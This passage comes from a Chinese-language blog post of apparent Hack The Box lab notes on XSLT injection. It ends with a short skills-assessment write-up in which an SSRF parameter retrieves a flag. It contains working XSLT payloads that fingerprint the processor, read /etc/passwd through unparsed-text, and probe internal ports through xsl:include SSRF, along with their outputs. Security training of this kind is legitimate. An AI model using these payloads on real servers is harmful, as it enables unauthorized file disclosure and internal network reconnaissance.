class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>A and M<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1988<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bridge of Spies<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>T`Pau<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Siren<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1987<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Private Dancer<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Tina Turner<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Capitol<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1983<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Midt om natten<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Kim Larsen<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>EU<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Medley<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.80<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1983<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Pavarotti Gala Concert<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Luciano Pavarotti<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>DECCA<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1991<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The dock of the bay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Otis Redding<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Stax Records<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1968<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Picture book<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Simply Red<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>EU<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Elektra<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.20<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1985<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Red<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>The Communards<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>London<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.80<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1987<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Unchain my heart<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Joe Cocker<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>EMI<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.20<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1987<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="transformation-xsl"><a href="#transformation-xsl" class="headerlink" title="transformation.xsl"></a>transformation.xsl</h4><p>Code: </p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>My CD Collection<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">"#9acd32"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Artist<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"catalog/cd/title"</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"catalog/cd/artist"</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>我们需要理解XML格式以了解转换是如何工作的。</p>
<ul>
<li>第一行通常是XML版本和编码</li>
<li>接下来，它将拥有XSL根节点<code>xsl:stylesheet</code></li>
<li>然后，我们将在<code>xsl:template match="&lt;PATH&gt;"</code>中获得指令。在这种情况下，它将适用于任何XML节点。</li>
<li>之后，将为XML结构中与前一行匹配的任何项定义转换。</li>
<li>要从XML文档中选择某些项目，XPATH语言以<code>&lt;xsl:value-of select="&lt;NODE&gt;/&lt;SUBNODE&gt;/&lt;VALUE&gt;"/&gt;</code>的形式使用。</li>
</ul>
<p>要查看结果，我们将使用命令行解析器。这可以通过以下方式实现：</p>
<h4 id="Transformation-through-the-terminal"><a href="#Transformation-through-the-terminal" class="headerlink" title="Transformation through the terminal"></a>Transformation through the terminal</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:transformation.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 3 column 50 of transformation.xslt:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;body&gt;</span><br><span class="line">      &lt;h2&gt;My CD Collection&lt;/h2&gt;</span><br><span class="line">      &lt;table border="1"&gt;</span><br><span class="line">         &lt;tr bgcolor="#9acd32"&gt;</span><br><span class="line">            &lt;th&gt;Title&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Artist&lt;/th&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Empire Burlesque&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Bob Dylan&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">      &lt;/table&gt;</span><br><span class="line">   &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>下面的文件可用于检测底层预处理器。</p>
<h4 id="detection-xsl"><a href="#detection-xsl" class="headerlink" title="detection.xsl"></a>detection.xsl</h4><p>Code: </p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">"html"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSLT identification<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span>Version:<span class="tag">&lt;/<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:version')"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span>Vendor:<span class="tag">&lt;/<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:vendor')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span>Vendor URL:<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:vendor-url')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>现在让我们运行前面的命令，但这一次使用detection.xsl文件。</p>
<h4 id="Transformation-through-the-terminal-1"><a href="#Transformation-through-the-terminal-1" class="headerlink" title="Transformation through the terminal"></a>Transformation through the terminal</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:detection.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">&lt;h2&gt;XSLT identification&lt;/h2&gt;&lt;b&gt;Version:&lt;/b&gt;2.0&lt;br&gt;&lt;b&gt;Vendor:&lt;/b&gt;SAXON 9.1.0.8 from Saxonica&lt;br&gt;&lt;b&gt;Vendor URL:&lt;/b&gt;http://www.saxonica.com/&lt;br&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>基于预处理器，我们可以查看此版本的JavaScript文档，以确定感兴趣的函数，例如以下函数。</p>
<ul>
<li><code>unparsed-text</code>可以用来读取本地文件。</li>
</ul>
<h4 id="readfile-xsl"><a href="#readfile-xsl" class="headerlink" title="readfile.xsl"></a>readfile.xsl</h4><p>Code: </p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> <span class="attr">xmlns:abc</span>=<span class="string">"http://php.net/xsl"</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"unparsed-text('/etc/passwd', 'utf-8')"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="通过终端进行转换"><a href="#通过终端进行转换" class="headerlink" title="通过终端进行转换"></a>通过终端进行转换</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:readfile.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 1 column 111 of readfile.xsl:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;root:x:0:0:root:/root:/usr/bin/zsh</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li><code>xsl:include</code>可用于执行SSRF</li>
</ul>
<p>如果我们能够控制转化，我们也可以发动SSRF攻击。</p>
<h4 id="ssrf-xsl"><a href="#ssrf-xsl" class="headerlink" title="ssrf.xsl"></a>ssrf.xsl</h4><p>Code: 验证码： xmlXML</p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> <span class="attr">xmlns:abc</span>=<span class="string">"http://php.net/xsl"</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:5000/xslt"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="通过终端进行转换-1"><a href="#通过终端进行转换-1" class="headerlink" title="通过终端进行转换"></a>通过终端进行转换</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">Error at xsl:include on line 2 column 49 of ssrf.xsl:</span><br><span class="line">  XTSE0165: java.io.FileNotFoundException: http://127.0.0.1:5000/xslt</span><br><span class="line">Failed to compile stylesheet. 1 error detected. </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">Error at xsl:include on line 2 column 49 of ssrf.xsl:</span><br><span class="line">  XTSE0165: java.net.ConnectException: Connection refused (Connection refused)</span><br><span class="line">Failed to compile stylesheet. 1 error detected.</span><br></pre></td></tr></tbody></table></figure>

<p>检查上面当我们打开或关闭端口时的不同响应。如果你想在Pwnbox或本地机器上尝试这个，尝试执行上面的<code>saxonb-xslt</code>命令一次，在端口5000上没有监听，一次在端口5000上有一个HTTP服务器监听（在单独的选项卡或终端中的<code>sudo python3 -m http.server 5000</code>）。</p>
<p>我们在本节的开头介绍了一些技术堆栈标识XSL文件。下面是一个，比以前的大。试着用它来重现上面的例子。</p>
<h4 id="fingerprinting-xsl"><a href="#fingerprinting-xsl" class="headerlink" title="fingerprinting.xsl"></a>fingerprinting.xsl</h4><p>Code: </p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line"> Version: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:version')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> Vendor: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:vendor')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> Vendor URL: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:vendor-url')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"system-property('xsl:product-name')"</span>&gt;</span></span><br><span class="line"> Product Name: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:product-name')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"system-property('xsl:product-version')"</span>&gt;</span></span><br><span class="line"> Product Version: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:product-version')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"system-property('xsl:is-schema-aware')"</span>&gt;</span></span><br><span class="line"> Is Schema Aware ?: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:is-schema-aware')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"system-property('xsl:supports-serialization')"</span>&gt;</span></span><br><span class="line"> Supports Serialization: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:supportsserialization')"</span></span></span><br><span class="line"><span class="tag">/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"system-property('xsl:supports-backwards-compatibility')"</span>&gt;</span></span><br><span class="line"> Supports Backwards Compatibility: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:supportsbackwards-compatibility')"</span></span></span><br><span class="line"><span class="tag">/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="通过终端进行转换-2"><a href="#通过终端进行转换-2" class="headerlink" title="通过终端进行转换"></a>通过终端进行转换</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:fingerprinting.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 2 column 80 of fingerprinting.xsl:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"> Version: 2.0&lt;br/&gt;</span><br><span class="line"> Vendor: SAXON 9.1.0.8 from Saxonica&lt;br/&gt;</span><br><span class="line"> Vendor URL: http://www.saxonica.com/&lt;br/&gt;</span><br><span class="line"> Product Name: SAXON&lt;br/&gt;</span><br><span class="line"> Product Version: 9.1.0.8&lt;br/&gt;</span><br><span class="line"> Is Schema Aware ?: no&lt;br/&gt;</span><br><span class="line"> Supports Serialization: &lt;br/&gt;</span><br><span class="line"> Supports Backwards Compatibility: &lt;br/&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>我们也可以使用下面的<a target="_blank" rel="noopener" href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt">wordlist</a>来实现目标应用程序中的暴力破解功能。</p>
<h1 id="Server-Side-Attacks-Skills-Assessment"><a href="#Server-Side-Attacks-Skills-Assessment" class="headerlink" title="Server-Side Attacks - Skills Assessment"></a>Server-Side Attacks - Skills Assessment</h1><p>查看jquery.js文件，</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">function dec(str) {</span><br><span class="line">	var w = atob(str);</span><br><span class="line">	return w.split("").reverse().join("");</span><br><span class="line">}</span><br><span class="line">function getmessage() {</span><br><span class="line">	var x = "Ly86cHR0aA==";</span><br><span class="line">	var y = "dHNvaC5ub2l0YWNvbC53b2RuaXc=";</span><br><span class="line">	var z = "dHh0LmVnYXNzZW0vMDgwODoxLjAuMC43MjEvLzpwdHRoPXQzM2w/M000M2wxRnQ0aFR0M0cv";</span><br><span class="line">	var woot = dec(x) + eval(dec(y)) + dec(z);</span><br><span class="line">	fetch(woot)</span><br><span class="line">	.then(response =&gt; response.text())</span><br><span class="line">	.then(data =&gt; {</span><br><span class="line">		return confirm(data);</span><br><span class="line">	});</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>把xyzbase64解码之后，再反向，得到：</p>
<p>/G3tTh4tF1l34M3?l33t=<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/message.txtwindow.location.hosthttp://">http://127.0.0.1:8080/message.txtwindow.location.hosthttp://</a></p>
<p>直接访问/G3tTh4tF1l34M3?l33t=<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/flag.txt">http://127.0.0.1:8080/flag.txt</a></p>
<p>一开始以为考点肯定是SSTI，结果竟然一个SSRF秒了，阿哲</p>
